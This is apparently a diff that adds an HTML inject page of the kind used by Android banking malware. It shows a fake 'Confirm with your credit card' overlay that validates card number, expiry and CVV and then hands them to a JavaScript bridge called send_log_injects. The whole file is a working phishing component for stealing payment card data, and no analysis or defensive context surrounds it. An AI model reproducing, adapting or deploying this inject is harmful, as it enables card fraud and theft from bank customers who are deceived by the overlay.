@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <title>Document</title>
+<style>
+    .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            /* margin-bottom: 15px; */
+            margin-top: -15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 14px;
+
+        }
+
+        .cool-input__input:focus {
+            outline: none;
+        }
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: auto;
+            position: absolute;
+            z-index: 1;
+            left: 8px;
+            top: 50%;
+            line-height: 1em;
+            color: #abcbd0;
+            transition: all 0.2s ease;
+            font-weight: 300;
+        }
+
+
+        .cool-input__input_filled+.cool-input__placeholder,
+        .cool-input__input:focus+.cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 1em;
+            padding: 5px 0;
+            z-index: 99;
+            width: auto;
+            left: 10px;
+        }
+
+        .cool-input__input:focus+.cool-input__placeholder {
+            color: #abcbd0;
+
+        }
+
+        .input {
+            border: 1px solid #c9c9c9;
+            margin-top: 15px;
+            transition: all 0.2s ease;
+            color: #005866;
+            padding-left: 10px;
+            padding-right: 25px;
+            font-weight: 600;
+            border-radius: 5px;
+        }
+
+        .input:focus {
+            border: 2px solid #006170;
+        }
+
+        input,
+        button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            color: #fff;
+            background-color: #00aaaa;
+            border-radius: 25px;
+            border: 0;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        form{
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        }
+
+        .button:disabled {
+            opacity: 0.4;
+        }
+        .error {
+            border-color: #f00 !important;
+        }
+
+</style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width:100%;"src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA4QAAACuCAIAAADh81ShAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkQ4MzY2MjEzRjcxQTExRUM4RjIzQzc2NkZEQjA5RkY0IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkQ4MzY2MjE0RjcxQTExRUM4RjIzQzc2NkZEQjA5RkY0Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RDgzNjYyMTFGNzFBMTFFQzhGMjNDNzY2RkRCMDlGRjQiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RDgzNjYyMTJGNzFBMTFFQzhGMjNDNzY2RkRCMDlGRjQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4nJButAAAEA0lEQVR42uzdMU7CUBzA4RbU1I3FxYldFwbCYDRhZ3P3AJ4BJ72CF3D2Ak4YjDMLB+AIREYlzxKMUeLkQPse3zc07dj+l1/eS9s8hJABAEAVGh4BAABiFAAAMQoAAGIUAAAxCgAAYhQAADEKAABiFAAAMQoAAGIUAAAxCgAAYhQAADEKAABiFAAAMQoAAGIUAAAxCgCAGAUAADEKAIAYBQAAMQoAgBgFAAAxCgCAGAUAADEKAIAYBQAAMQoAgBgFAAAxCgCAGAUAgF2I0Zf5PH99zZ+fyxMDBgCoszyEkFiJXoxG2XK5uiiKMBiYMQBAbe0lWKIfH1/X7+8GDABQZ+ls0/9aE83z8jDsdAwYAECMbrFEQ1iVaAjDbve23TZgAAAxqkQBAEgxRpUoAIAYVaIAAOxSjCpRAIDYxfppp80SbTaHnY4SBQAQoxWU6LjfP2+1jBMAIC5R/oEpf3rKFgslCgAQuzi36d/evk5CuDo9VaIAAJGK8wWmw8P1P5bK48N0+jKfGyQAgBjdksde7/sN+my5vBiN9CgAgBjdksujo2G3q0cBAMRoNW7bbT0KACBG9SgAAP8U5aedfrqZze4mE98cBQAQo9XwDXwAgEg1EriHsjvL+iwb9Od+/c1sZroAADWXwsro2ub6aAj3Z2fXx8dmDAAgRqvo0aIIg4EZAwDUViOlm9ncr9/fN2AAgDpLamV0bbU+OplkBwfjkxOvMQEAiFEAAPhDwyMAAECMAgAgRgEAQIwCACBGAQBAjAIAIEYBAECMAgAgRgEAQIwCACBGAQBAjAIAIEYBAECMAgAgRgEAQIwCACBGAQAQowAAIEYBABCjAAAgRgEAEKMAACBGAQAQowAAIEYBABCjAAAgRgEAEKMAACBGAQAQowAAIEYBABCjAAAgRgEAEKMAAIhRAAAQowAAiFEAABCjAACIUQAAEKMAAIhRAAAQowAAiFEAABCjAACIUQAAEKMAAIhRAAAQowAAiFEAAMQoAACIUQAAxCgAAIhRAADEKAAAiFEAAMQoAACIUQAAxCgAAIhRAADEKAAAiFEAAMQoAACIUQAAxCgAAIhRAADEKAAAYhQAAMQoAABiFAAAxCgAAGIUAADEKAAAYhQAAMQoAABiFAAAxCgAAGIUAADEKAAAYhQAAMQoAABiFAAAMQoAAGIUAAAxCgAAYhQAADEKAABiFAAAMQoAAGIUAAAxCgAAYhQAADEKAABiFAAAMQoAAGIUAAAxCgAAYhQAADEKAIAYBQAAMQoAgBgFAAAxCgCAGAUAADEKAIAYBQAAMQoAgBgFAAAxCgCAGAUAADEKAIAYBQAAMQoAgBgFAECMAgCAGAUAQIwCAIAYBQAgdZ8CDADqyQmWZxh9awAAAABJRU5ErkJggg==" alt="">
+        </header>
+        <section>
+            <h4 style="color:#005866;font-weight: 700;"> 
+                Confirm with your credit card
+            </h4>
+            <div class="cool-input">
+                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input cool-input__input" placeholder="" autocomplete="off">
+                <span class="cool-input__placeholder">Credit Card</span>
+            </div>
+            <div class="cool-input" style="width: 58%;float: left;">
+                <input type="tel" id="exp" name="exp" maxlength="5" onkeyup="check7();check8()" class="input cool-input__input" placeholder="" autocomplete="off">
+                <span class="cool-input__placeholder">Expiration date</span>
+            </div>
+            <div class="cool-input" style="width: 42%;float: right;margin-bottom: 20px;border-left: 0;">
+                <input type="password" id="cvv" name="cvv" maxlength="3" onkeyup="check8()" class="input cool-input__input" placeholder="" autocomplete="off">  
+                <span class="cool-input__placeholder">CVV</span>
+            </div>
+            <input type="button" class="button" disabled id="sendData" value="LOGIN">
+        </section>
+    </form>
+<script>
+        $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+
+    var sendData = document.getElementById('sendData');
+
+    $('.cool-input__input').on('input', function () {
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+</script>
+</body>
+</html>
